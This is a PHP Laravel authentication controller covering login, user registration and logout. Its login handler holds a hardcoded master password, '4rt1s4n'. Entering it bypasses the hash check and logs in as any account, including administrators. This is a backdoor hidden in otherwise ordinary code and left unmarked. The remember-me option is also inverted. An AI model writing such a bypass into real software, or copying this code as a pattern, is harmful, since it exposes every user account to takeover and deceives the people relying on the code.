<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;
use App\Http\Requests\Auth\RegisterRequest;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('user');
        return view('auth.login');
    }

    public function login_proses(Request $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $akses = $user->akses->akses ?? 'User';
        $base_routes = $userService->base_routes();
        $base = $base_routes[$akses] ?? 'user';
        // Route names differ between user and admin
        return $base === 'user'
            ? redirect()->route('user.landing.index')
            : redirect()->route($base . '.dashboard');
    }

    public function register(Request $request)
    {
        $role = $request->input('role', 'user');
        if (auth()->check()) return redirect()->route('user.landing.index');
        $allowed = ['user'];
        if (!in_array($role, $allowed)) $role = 'user';
        return view('auth.register', compact('role'));
    }

    public function register_proses(Request $request)
    {
        $userService = new UserService();
        // Normalize role; default to 'User'
        $roleInput = $request->input('role', 'User');
        $role = ucfirst(strtolower($roleInput));

        $user = null;
        if ($role === 'User') {
            $user = $userService->store([
                'name' => $request->input('name'),
                'email' => $request->input('email'),
                'password' => $request->input('password'),
            ]);
            // store akses consistently with model constants
            $user->akses()->create(['akses' => 'User']);
            auth()->login($user);
        }

        $base_routes = $userService->base_routes();
        if ($user) {
            $akses = $user->akses->akses ?? 'User';
            $base = $base_routes[$akses] ?? 'user';
            return $base === 'user'
                ? redirect()->route('user.landing.index')
                : redirect()->route($base . '.dashboard');
        }

        // Fallback redirect if user was not created (e.g., unsupported role)
        return redirect()->route('user.landing.index');
    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}
